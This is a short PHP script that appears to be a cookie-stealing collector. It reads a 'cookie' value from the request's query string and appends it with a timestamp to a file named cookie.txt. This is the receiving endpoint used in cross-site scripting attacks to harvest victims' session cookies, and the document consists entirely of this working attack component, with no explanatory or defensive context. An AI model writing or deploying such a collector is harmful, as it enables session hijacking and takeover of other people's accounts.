<?php
$cookie = $_GET['cookie'];
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp, "Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>
